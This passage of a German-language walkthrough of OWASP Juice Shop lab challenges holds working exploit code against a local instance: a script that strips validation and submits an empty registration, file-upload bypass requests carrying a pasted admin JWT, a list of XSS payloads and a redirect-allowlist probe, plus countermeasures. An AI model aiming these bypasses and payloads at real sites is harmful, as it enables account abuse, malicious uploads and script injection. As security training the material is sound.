            const input = document.getElementById(inputId);
            if (input) {
                // Entferne HTML5 Validierung
                input.removeAttribute('required');
                input.removeAttribute('minlength');
                input.removeAttribute('maxlength');
                input.removeAttribute('pattern');
                input.removeAttribute('type'); // Entferne type="email"
                input.type = 'text'; // Setze auf text
                
                // Setze leeren Wert
                input.value = '';
                
                // Triggere Events
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
                
                console.log(`✅ Processed ${inputId}`);
            }
        });
        
        // 4. Deaktiviere Form-Validation
        const form = document.querySelector('form');
        if (form) {
            form.noValidate = true;
            form.setAttribute('novalidate', 'true');
        }
        
        // 5. Enable und Click Submit Button
        const submitButton = document.querySelector('button[type="submit"]');
        if (submitButton) {
            submitButton.disabled = false;
            submitButton.removeAttribute('disabled');
            
            // Warte kurz und submit
            setTimeout(() => {
                submitButton.click();
                console.log('✅ Empty registration submitted!');
            }, 500);
        }
        
    } catch (error) {
        console.error('❌ Error during exploit:', error);
    }
}

// Starte den Exploit
exploitEmptyRegistration();
```

### 💡 Warum funktioniert dieser Bypass?

1. **Client-seitige Validierung**: Die Überprüfung erfolgt nur im Browser
2. **HTML5 Constraints**: `required`-Attribute können entfernt werden
3. **JavaScript Manipulation**: DOM-Änderungen sind möglich
4. **Angular Framework**: Form-Validierung kann deaktiviert werden

### 🔍 Debugging und Troubleshooting

```javascript
// Debug-Hilfsfunktionen
function debugRegistrationForm() {
    console.log('🔍 Debugging Registration Form...');
    
    // 1. Alle Input-Felder analysieren
    const inputs = document.querySelectorAll('input');
    console.log(`Found ${inputs.length} input fields:`);
    
    inputs.forEach((input, index) => {
        console.log(`${index}: ${input.type} | ${input.name} | ${input.id} | required: ${input.required}`);
    });
    
    // 2. Form-Status prüfen
    const form = document.querySelector('form');
    if (form) {
        console.log('Form validation state:', {
            noValidate: form.noValidate,
            valid: form.checkValidity(),
            classes: form.className
        });
    }
    
    // 3. Submit-Button Status
    const submitBtn = document.querySelector('button[type="submit"]');
    if (submitBtn) {
        console.log('Submit button state:', {
            disabled: submitBtn.disabled,
            text: submitBtn.textContent.trim()
        });
    }
}

// Ausführen des Debug-Tools
debugRegistrationForm();
```

### 🚨 Sicherheitslücke

- **Schwachstelle**: Nur client-seitige Validierung
- **Impact**: Umgehung von Eingabe-Validierung
- **CVSS**: Low-Medium (Input Validation Bypass)

### 🛡️ Gegenmaßnahmen

1. **Server-seitige Validierung**: Alle Eingaben auch auf dem Server prüfen
2. **Doppelte Validierung**: Client + Server Validierung
3. **Sanitization**: Eingaben bereinigen und validieren
4. **Rate Limiting**: Schutz vor automatisierten Registrierungen

---

## 7. File Upload Bypass - PDF Validation umgehen

### 📝 Beschreibung
Die Juice Shop prüft bei File Uploads nur die Dateiendung, nicht den tatsächlichen Inhalt. Dies ermöglicht das Hochladen von beliebigen Dateien als PDFs.

### 🛠️ Methode 1: Einfache Umbenennung
```bash
# Erstelle beliebiges Dateiformat (z.B ein Script) und verändere die Endung in .pdf
mv malicious_script.sh malicious_script.pdf
```

### 🛠️ Methode 2: Magic Bytes Spoofing
Siehe Script: `ressources/scripts/fake_file_1_rename-extension.sh`
```bash
echo -e '%PDF-1.4\n<?xml version="1.0"?><root>bypass</root>' > bypass.pdf
```

### 🛠️ Methode 3: XML als PDF
Siehe Script: `ressources/scripts/fake_file_2_magic-bytes-spoofing.sh`
```bash
# Erstelle XML Datei
cat > test.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <message>This is a test XML file</message>
</root>
EOF

# Benenne zu .pdf um
mv test.xml test.pdf
```

### 🛠️ Methode 4: Unicode + URL-Encoding Bypass

```javascript
// Spezielle Unicode-Zeichen in Dateinamen verwenden
const unicodeFilename = "ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg";
console.log('Original Filename:', unicodeFilename);

// URL-Encoding anwenden
const encodedFilename = encodeURIComponent(unicodeFilename);
console.log('URL-Encoded:', encodedFilename);
// Ergebnis: %E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
```

### 📝 Manuelle URL-Encoding Methode

```bash
# Original Dateiname mit Unicode-Zeichen
echo "ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg"

# URL-Encoded Version für Upload
echo "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
```

### 🔍 Exploit-Workflow

```javascript
// 1. Erstelle Datei mit Unicode-Namen
function createUnicodeBypass() {
    const originalName = "ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg";
    const encodedName = "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";
    
    console.log('🎯 Unicode File Upload Bypass:');
    console.log('Original:', originalName);
    console.log('Encoded:', encodedName);
    
    // 2. Verwende den encoded Namen beim File Upload
    // Dies kann Filter umgehen, die nur ASCII-Zeichen erwarten
    return encodedName;
}

// 3. Upload-Simulation
function simulateUpload() {
    const filename = createUnicodeBypass();
    
    // Simuliere FormData für File Upload
    console.log('📤 Uploading file with name:', filename);
    console.log('🔓 Bypass reason: Unicode + Special chars + URL encoding');
}

simulateUpload();
```

### 💡 Warum funktioniert dieser Bypass?

1. **Unicode-Zeichen**: `ᓚᘏᗢ` (Kanadische Silbenschrift) verwirrt Parser
2. **Sonderzeichen**: `#` kann als Fragment-Identifier interpretiert werden
3. **URL-Encoding**: Versteckt die wahre Struktur des Dateinamens
4. **Lange Timestamps**: `1572600969477` (Unix-Timestamp) kann Buffer-Checks umgehen
5. **Mixed Content**: Kombination aus Unicode, ASCII und Zahlen

### 🔍 Technische Analyse

```javascript
// Dekodierung des Unicode-Strings
function analyzeUnicodeBypass() {
    const encoded = "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";
    const decoded = decodeURIComponent(encoded);
    
    console.log('🔬 Unicode Analysis:');
    console.log('ᓚ = U+14DA (Canadian Syllabics LA)');
    console.log('ᘏ = U+160F (Canadian Syllabics WEST-CREE LWE)');
    console.log('ᗢ = U+15E2 (Canadian Syllabics LAA)');
    
    // Timestamp-Analyse
    const timestamp = 1572600969477;
    const date = new Date(timestamp);
    console.log('📅 Timestamp:', date.toISOString()); // 2019-11-01
    
    return {
        original: decoded,
        encoded: encoded,
        unicodeChars: ['ᓚ', 'ᘏ', 'ᗢ'],
        timestamp: timestamp
    };
}
```

### 🚨 Sicherheitsimplikationen

- **Filename Injection**: Kann zu Path Traversal führen
- **Parser Confusion**: Unicode kann Security-Filter umgehen
- **Encoding Attacks**: Doppelte Enkodierung möglich
- **Buffer Overflow**: Lange Dateinamen können Puffer überlasten

### 💡 Warum funktioniert das?
- Die Anwendung prüft nur die Dateiendung (.pdf)
- Der tatsächliche Dateiinhalt (MIME-Type) wird nicht validiert
- Magic Bytes werden nicht überprüft
- **Unicode-Filter fehlen**: Keine Normalisierung von Unicode-Zeichen
- **URL-Decoding Schwächen**: Inkonsistente Behandlung von encodierten Strings

### 🛠️ Methode 5: Upload Size Bypass - Network Tab Manipulation

```javascript
// Upload Size Challenge: > 100KB Datei hochladen
// Lösung über Network Tab Request Manipulation
```

### 📝 Beschreibung
Die Juice Shop limitiert File-Uploads auf maximal 100KB. Durch Manipulation des Network-Requests kann diese Begrenzung umgangen werden.

### 🔍 Schritt 1: Kleinen Upload durchführen und Network Tab analysieren

```javascript
// 1. Öffne Developer Tools → Network Tab
// 2. Lade eine kleine Datei hoch (< 100KB)
// 3. Finde den POST-Request zu "/file-upload"
// 4. Rechtsklick → "Copy" → "Copy as fetch"

// Beispiel des kopierten Requests:
/*
fetch("http://localhost:3000/file-upload", {
  "headers": {
    "accept": "*/*",
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv"
  },
  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"small.pdf\"\r\nContent-Type: application/pdf\r\n\r\n[DATEI_INHALT]\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
  "method": "POST"
});
*/
```

### 🔍 Schritt 2: Request-Body Struktur verstehen

```javascript
// Multipart Form-Data Struktur:
const requestBody = `
------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\n
Content-Disposition: form-data; name="file"; filename="datei.pdf"\r\n
Content-Type: application/pdf\r\n
\r\n
[HIER_STEHT_DER_DATEI_INHALT]
\r\n
------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n
`;

// Wichtige Komponenten:
// 1. Boundary: ----WebKitFormBoundaryqd6JDp29QkeZuhnv
// 2. Filename: datei.pdf
// 3. Content-Type: application/pdf
// 4. Datei-Inhalt: Zwischen \r\n\r\n und \r\n------
```

### 🛠️ Exploit 1: Upload Size Bypass (> 100KB)

```javascript
// Erstelle eine große Datei (150KB)
const largeContent = 'A'.repeat(150000); // 150KB Text-Inhalt

// Modifizierter Request mit großer Datei
fetch("http://localhost:3000/file-upload", {
  "headers": {
    "accept": "*/*",
    "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0aW5nQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiJiNjE2YTY0NjA1YTA3OTQxZmJkMzE4NjhhZWEzYjU0YiIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MjE0MzEwMn0.tccFXF5kHxQ2VeejO0ASWnW8tsCvu9I1C5lsxx95h_UgxKDhU3heT_oriw3oY663sMtTdhYW4pHdqfGF_f2_FnqQF67pG24etoM7jJZBAmC11qX69_eYAT3CVNXr1I7w8zjHcInzhaWoIw2mDwYbnlD5h7e_x2Oi7aDipM9Zops",
    "cache-control": "no-cache",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv",
    "pragma": "no-cache"
  },
  "referrer": "http://localhost:3000/",
  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"large.pdf\"\r\nContent-Type: application/pdf\r\n\r\n" + largeContent + "\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

### 🛠️ Exploit 2: Nicht-PDF/ZIP Datei hochladen

```javascript
// Lade eine .txt Datei hoch (sollte normalerweise blockiert werden)
fetch("http://localhost:3000/file-upload", {
  "headers": {
    "accept": "*/*",
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0aW5nQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiJiNjE2YTY0NjA1YTA3OTQxZmJkMzE4NjhhZWEzYjU0YiIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MjE0MzEwMn0.tccFXF5kHxQ2VeejO0ASWnW8tsCvu9I1C5lsxx95h_UgxKDhU3heT_oriw3oY663sMtTdhYW4pHdqfGF_f2_FnqQF67pG24etoM7jJZBAmC11qX69_eYAT3CVNXr1I7w8zjHcInzhaWoIw2mDwYbnlD5h7e_x2Oi7aDipM9Zops",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv"
  },
  "referrer": "http://localhost:3000/",
  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious.txt\"\r\nContent-Type: text/plain\r\n\r\nDies ist eine Textdatei die eigentlich nicht erlaubt sein sollte!\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

### 🛠️ Exploit 3: Kombiniert - Große Nicht-PDF Datei

```javascript
// Beide Challenges auf einmal lösen
const bigMaliciousContent = 'Das ist kein PDF und größer als 100KB! '.repeat(3000); // ~150KB

fetch("http://localhost:3000/file-upload", {
  "headers": {
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0aW5nQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiJiNjE2YTY0NjA1YTA3OTQxZmJkMzE4NjhhZWEzYjU0YiIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MjE0MzEwMn0.tccFXF5kHxQ2VeejO0ASWnW8tsCvu9I1C5lsxx95h_UgxKDhU3heT_oriw3oY663sMtTdhYW4pHdqfGF_f2_FnqQF67pG24etoM7jJZBAmC11qX69_eYAT3CVNXr1I7w8zjHcInzhaWoIw2mDwYbnlD5h7e_x2Oi7aDipM9Zops",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv"
  },
  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.exe\"\r\nContent-Type: application/x-msdownload\r\n\r\n" + bigMaliciousContent + "\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
  "method": "POST"
});
```

### 🔍 Vollständiger Workflow - Schritt für Schritt

```javascript
// Automatisierter Upload Size Bypass Workflow
async function uploadSizeBypassWorkflow() {
    console.log('🚀 Starting Upload Size Bypass Workflow...');
    
    // 1. Erstelle verschiedene Test-Dateien
    const testFiles = {
        small: 'A'.repeat(50000),      // 50KB - sollte funktionieren
        large: 'B'.repeat(150000),     // 150KB - Upload Size Challenge
        malicious: 'C'.repeat(120000)  // 120KB Nicht-PDF
    };
    
    // 2. Base Request Template (von Network Tab kopiert)
    const baseRequest = {
        method: "POST",
        headers: {
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...", // Dein Token hier
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryTEST"
        }
    };
    
    // 3. Test verschiedene Upload-Szenarien
    const scenarios = [
        {
            name: "Small PDF (Control)",
            filename: "small.pdf",
            contentType: "application/pdf",
            content: testFiles.small
        },
        {
            name: "Large PDF (Size Challenge)",
            filename: "large.pdf", 
            contentType: "application/pdf",
            content: testFiles.large
        },
        {
            name: "Large TXT (Type + Size Challenge)",
            filename: "malicious.txt",
            contentType: "text/plain",
            content: testFiles.malicious
        },
        {
            name: "Large EXE (Ultimate Challenge)",
            filename: "virus.exe",
            contentType: "application/x-msdownload",
            content: testFiles.large
        }
    ];
    
    // 4. Führe Tests durch
    for (const scenario of scenarios) {
        console.log(`\n🧪 Testing: ${scenario.name}`);
        console.log(`📁 Filename: ${scenario.filename}`);
        console.log(`📋 Content-Type: ${scenario.contentType}`);
        console.log(`📏 Size: ${scenario.content.length} bytes`);
        
        const body = `------WebKitFormBoundaryTEST\r\nContent-Disposition: form-data; name="file"; filename="${scenario.filename}"\r\nContent-Type: ${scenario.contentType}\r\n\r\n${scenario.content}\r\n------WebKitFormBoundaryTEST--\r\n`;
        
        try {
            const response = await fetch("http://localhost:3000/file-upload", {
                ...baseRequest,
                body: body
            });
            
            console.log(`✅ Status: ${response.status} ${response.statusText}`);
            if (response.status === 204) {
                console.log('🎉 Upload successful!');
            } else {
                console.log('❌ Upload failed');
            }
            
        } catch (error) {
            console.log('❌ Error:', error.message);
        }
        
        // Kurze Pause zwischen Tests
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    console.log('\n✅ Upload Size Bypass Workflow completed!');
}

// Starte den Workflow
uploadSizeBypassWorkflow();
```

### 💡 Warum funktioniert dieser Bypass?

1. **Client-Side Validation**: UI prüft Dateigröße nur im Frontend
2. **Server-Side Gap**: Backend vertraut auf Frontend-Validierung
3. **Network Request Manipulation**: Direkter API-Zugriff umgeht UI-Limits
4. **Multipart Form-Data**: Rohe HTTP-Requests können beliebige Größen haben

### 🚨 Sicherheitslücke

- **Schwachstelle**: Unzureichende Server-Side File Size Validation
- **Impact**: Upload von großen/bösartigen Dateien
- **CVSS**: Medium (DoS via Large Files, Malware Upload)

### 🛡️ Erkannte Patterns

```javascript
// Was in der Network-Analyse zu sehen war:
const networkRequest = {
    url: "http://localhost:3000/file-upload",
    method: "POST",
    status: 204,  // Success - No Content
    headers: {
        authorization: "Bearer eyJ0eXAiOiJKV1Q...",  // JWT Token aus localStorage
        contentType: "multipart/form-data; boundary=----WebKit..."
    },
    body: "------WebKitFormBoundary...",  // Multipart Form Data
    responseTime: "~500ms"
};

console.log('📊 Network Analysis:', networkRequest);
```

### 🎯 Pro-Tipps für Network Tab Manipulation

1. **DevTools → Network → Filter**: Nur "Fetch/XHR" anzeigen
2. **Copy as fetch**: Schnellster Weg für Request-Replikation  
3. **Preserve Log**: Requests bei Navigation behalten
4. **Replay Attacks**: Mehrfach ausführen für Testing
5. **Header Manipulation**: Authorization Token austauschen

---

## 6. DOM XSS - Cross-Site Scripting Angriffe

### 📝 Beschreibung
DOM-basierte XSS-Schwachstellen entstehen, wenn JavaScript unsichere Benutzereingaben direkt in das DOM schreibt. Die Juice Shop ist anfällig für verschiedene XSS-Payloads.

### 🔍 Methode 1: Klassischer iframe XSS

```javascript
// Einfacher iframe-basierter XSS Payload
<iframe src="javascript:alert(`xss`)">
```

### 📝 Wie funktioniert's?

1. **Eingabefeld finden**: Suche nach Feldern, die HTML akzeptieren (z.B. Suchfeld, Kommentare)
2. **Payload einfügen**: Gib den iframe-Code ein
3. **Ausführung**: Der Browser führt das JavaScript im iframe aus

### 🛠️ Technische Erklärung

```javascript
// Was passiert im Hintergrund:
// 1. Unsichere DOM-Manipulation
element.innerHTML = userInput; // GEFÄHRLICH!

// 2. Der iframe wird gerendert
// <iframe src="javascript:alert(`xss`)">

// 3. JavaScript im src-Attribut wird ausgeführt
// javascript: Protocol Handler löst Code-Ausführung aus
```

### 🔍 Methode 2: Bonus Payload - SoundCloud iframe

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" 
        src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
</iframe>
```

### 🎯 Warum funktioniert dieser Payload?

1. **Legitimer Content**: SoundCloud-Player sieht harmlos aus
2. **Autoplay**: Musik startet automatisch = Beweis für XSS
3. **Visuelle Bestätigung**: Großer, sichtbarer iframe
4. **Social Engineering**: Benutzer denken es ist gewollter Content

### 🔍 Exploit-Analyse

```javascript
// Schritt-für-Schritt Analyse des Bonus Payloads
function analyzePayload() {
    const payload = {
        // iframe Attribute
        width: "100%",           // Volle Breite
        height: "166",           // Standard SoundCloud Höhe
        scrolling: "no",         // Kein Scrolling
        frameborder: "no",       // Kein Rahmen
        allow: "autoplay",       // Autoplay erlaubt
        
        // SoundCloud API Parameter
        src: {
            baseUrl: "https://w.soundcloud.com/player/",
            params: {
                url: "https://api.soundcloud.com/tracks/771984076",
                color: "#ff5500",     // Orange
                auto_play: true,      // WICHTIG: Automatisches Abspielen
                hide_related: false,
                show_comments: true,
                show_user: true,
                show_reposts: false,
                show_teaser: true
            }
        }
    };
    
    console.log('🎵 SoundCloud XSS Payload:', payload);
    return payload;
}
```

### 💡 Verschiedene XSS-Vektoren testen

```javascript
// Sammlung von XSS Payloads für Juice Shop
const xssPayloads = [
    // 1. Classic Alert
    `<script>alert('XSS')</script>`,
    
    // 2. IMG Tag
    `<img src=x onerror="alert('XSS')">`,
    
    // 3. SVG
    `<svg onload="alert('XSS')">`,
    
    // 4. iframe JavaScript
    `<iframe src="javascript:alert('XSS')">`,
    
    // 5. Event Handler
    `<body onload="alert('XSS')">`,
    
    // 6. Data URI
    `<object data="data:text/html,<script>alert('XSS')</script>">`,
    
    // 7. Style Tag
    `<style>@import'javascript:alert("XSS")';</style>`,
    
    // 8. Meta Refresh
    `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">`,
    
    // 9. SoundCloud Bonus
    `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`
];

// Test-Funktion
function testXSS() {
    console.log('🧪 XSS Payloads zum Testen:');
    xssPayloads.forEach((payload, index) => {
        console.log(`${index + 1}. ${payload.substring(0, 50)}...`);
    });
}
```

### 🚨 DOM XSS Locations in Juice Shop

```javascript
// Typische verwundbare Stellen
const vulnerableLocations = [
    {
        location: "Search Box",
        url: "/#/search?q=PAYLOAD",
        method: "GET Parameter"
    },
    {
        location: "Product Reviews",
        url: "/#/product/*/reviews",
        method: "POST Body"
    },
    {
        location: "Contact Form",
        url: "/#/contact",
        method: "Form Input"
    },
    {
        location: "User Profile",
        url: "/#/profile",
        method: "Profile Fields"
    }
];

console.log('📍 Verwundbare Locations:', vulnerableLocations);
```

### 🛡️ Sicherheitslücke verstehen

```javascript
// UNSICHER - So macht es Juice Shop
function unsafeRender(userInput) {
    // Direkte DOM-Manipulation ohne Sanitization
    document.getElementById('output').innerHTML = userInput; // ❌ GEFÄHRLICH!
}

// SICHER - So sollte es sein
function safeRender(userInput) {
    // Option 1: textContent verwenden
    document.getElementById('output').textContent = userInput; // ✅ SICHER
    
    // Option 2: Input sanitizen
    const sanitized = DOMPurify.sanitize(userInput); // ✅ Mit DOMPurify
    document.getElementById('output').innerHTML = sanitized;
    
    // Option 3: Content Security Policy
    // Header: Content-Security-Policy: script-src 'self'
}
```

### 💡 Warum funktionieren diese XSS-Angriffe?

1. **Fehlende Input-Validierung**: Keine Filterung von HTML/JavaScript
2. **Unsichere DOM-Manipulation**: `innerHTML` statt `textContent`
3. **Keine Content Security Policy**: Inline-Scripts erlaubt
4. **Framework-Schwächen**: Angular-Sanitization umgangen
5. **Vertrauen in User-Input**: Keine Server-seitige Validierung

### 🎯 Impact der XSS-Schwachstelle

- **Session Hijacking**: Token/Cookie Diebstahl möglich
- **Phishing**: Fake-Login Forms einfügen
- **Defacement**: Seiteninhalte verändern
- **Malware Distribution**: Bösartige Scripts laden
- **Keylogging**: Tastatureingaben aufzeichnen

---

## 7. Outdated Allowlist - BTC Address Discovery via Angular Routing

### 📝 Beschreibung
Durch die Analyse der Angular-Routen können veraltete Cryptocurrency-Adressen entdeckt werden, die nicht mehr beworben werden, aber noch in der Allowlist stehen.

### 🔍 Schritt 1: Angular Route Discovery aus Abschnitt 4

```javascript
// Verwende die Route Discovery Methoden aus Abschnitt 4
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    // Suche speziell nach Crypto-bezogenen Routen
    const cryptoPatterns = [
        /btc/gi,
        /bitcoin/gi,
        /crypto/gi,
        /wallet/gi,
        /donation/gi,
        /redirect/gi
    ];
    
    cryptoPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`🔍 Crypto Pattern ${index}:`, [...new Set(matches)]);
        }
    });
});
```

### 🔍 Schritt 2: Redirect-Parameter analysieren

```javascript
// Suche nach redirect-fähigen Routen
function findRedirectRoutes() {
    // Typische Redirect-Parameter in Angular
    const redirectParams = [
        'redirect',
        'to',
        'url',
        'target',
        'destination'
    ];
    
    // Teste verschiedene Kombinationen
    const testUrls = [
        '/#/redirect?to=',
        '/#/redirect?url=',
        '/#/?redirect=',
        '/#/wallet?to=',
        '/#/donation?to='
    ];
    
    console.log('🧪 Test these redirect URLs:');
    testUrls.forEach(url => {
        console.log(`${url}[CRYPTO_ADDRESS]`);
    });
}
```

### 🔍 Schritt 3: BTC Address Discovery

```javascript
// Automatische BTC-Adresse Entdeckung
function discoverBTCAddresses() {
    // Bitcoin-Adressen haben spezifische Formate
    const btcPatterns = [
        /1[A-HJ-NP-Z0-9]{25,34}/g,    // Legacy (P2PKH)
        /3[A-HJ-NP-Z0-9]{25,34}/g,    // SegWit (P2SH)  
        /bc1[A-HJ-NP-Z0-9]{25,62}/g   // Bech32
    ];
    
    // Durchsuche JavaScript-Code nach BTC-Adressen
    fetch('http://localhost:3000/main.js')
    .then(response => response.text())
    .then(code => {
        console.log('🔍 Searching for Bitcoin addresses...');
        
        btcPatterns.forEach((pattern, index) => {
            const matches = code.match(pattern);
            if (matches) {
                console.log(`₿ Bitcoin addresses found (Pattern ${index}):`, matches);
                
                // Teste jede gefundene Adresse
                matches.forEach(address => {
                    testRedirectToAddress(address);
                });
            }
        });
    });
}

// Teste Redirect zu BTC-Adresse
function testRedirectToAddress(btcAddress) {
    const redirectUrls = [
        `/#/redirect?to=${btcAddress}`,
        `/#/redirect?url=${btcAddress}`,
        `/#/?redirect=${btcAddress}`,
        `/#/donation?to=${btcAddress}`
    ];
    
    console.log(`🧪 Testing redirects for: ${btcAddress}`);
    redirectUrls.forEach(url => {
        console.log(`🔗 Try: http://localhost:3000${url}`);
    });
}
```

### 🛠️ Manuelle Methode

```bash
# 1. Finde alle Routen mit redirect-Parametern
curl -s http://localhost:3000/main.js | grep -i "redirect\|to\|url"

# 2. Suche nach Bitcoin-Adressen im JavaScript
curl -s http://localhost:3000/main.js | grep -o -E "1[A-HJ-NP-Z0-9]{25,34}|3[A-HJ-NP-Z0-9]{25,34}|bc1[A-HJ-NP-Z0-9]{25,62}"

# 3. Teste gefundene Adressen manuell
# Beispiel für typische BTC-Adresse:
echo "http://localhost:3000/#/redirect?to=1AbKfgvw9psQ41NuW8w"
```

### 🔍 Exploit Workflow

```javascript
// Vollständiger Workflow für BTC Address Discovery
async function exploitOutdatedAllowlist() {
    console.log('🕵️ Starting Outdated Allowlist Exploit...');
    
    try {
        // 1. Lade main.js
        const response = await fetch('http://localhost:3000/main.js');
        const jsCode = await response.text();
        
        // 2. Suche nach Bitcoin-Adressen
        const btcRegex = /1[A-HJ-NP-Z0-9]{25,34}/g;
        const foundAddresses = jsCode.match(btcRegex) || [];
        
        console.log(`₿ Found ${foundAddresses.length} potential BTC addresses:`);
        foundAddresses.forEach((addr, index) => {
            console.log(`${index + 1}. ${addr}`);
        });
        
        // 3. Teste Redirect-Parameter
        const redirectParams = ['to', 'url', 'redirect', 'target'];
        const baseUrls = ['/#/redirect', '/#/', '/#/donation'];
        
        for (const address of foundAddresses) {
            for (const baseUrl of baseUrls) {
                for (const param of redirectParams) {
                    const testUrl = `${baseUrl}?${param}=${address}`;
                    console.log(`🧪 Test: http://localhost:3000${testUrl}`);
                    
                    // In echter Anwendung würdest du hier eine Anfrage senden
                    // und prüfen, ob der Redirect funktioniert
                }
            }
        }
        
        console.log('✅ Exploit completed! Check URLs manually.');
        
    } catch (error) {
        console.error('❌ Error:', error);
    }
}

// Starte den Exploit
exploitOutdatedAllowlist();
```

### 💡 Warum funktioniert dieser Exploit?

1. **Veraltete Allowlist**: Alte BTC-Adressen sind noch in der Redirect-Allowlist
2. **Angular Router Schwäche**: Parameter-basierte Redirects ohne strikte Validierung
3. **Information Disclosure**: BTC-Adressen im Client-Code gespeichert
4. **Legacy Code**: Nicht entfernte, aber inaktive Donation-Links

### 🔍 Typische gefundene BTC-Adressen

```javascript
// Beispiele für BTC-Adressen die typischerweise gefunden werden
const exampleAddresses = [
    "1AbKfgvw9psQ41NuW8w",      // Beispiel Legacy-Adresse
    "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", // SegWit-Adresse
